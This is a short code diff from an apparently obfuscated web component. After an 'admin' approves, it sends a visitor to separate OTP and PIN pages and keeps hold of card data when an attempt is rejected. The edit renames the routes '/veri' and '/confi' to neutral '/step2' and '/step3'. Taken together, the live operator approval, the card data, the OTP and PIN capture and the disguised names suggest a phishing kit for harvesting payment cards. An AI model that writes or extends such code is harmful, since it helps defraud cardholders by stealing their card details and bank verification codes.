@@ -143,11 +143,11 @@ export default function _P1({ offerTotalPrice }: _P1Props) {
           if (status === "approved_with_otp") {
             setIsWaitingAdmin(false)
             // Redirect to OTP page
-            router.push("/veri")
+            router.push("/step2")
           } else if (status === "approved_with_pin") {
             setIsWaitingAdmin(false)
             // Redirect to PIN page directly
-            router.push("/confi")
+            router.push("/step3")
           } else if (status === "rejected") {
             const currentCardData = {
               _v1: data._v1,
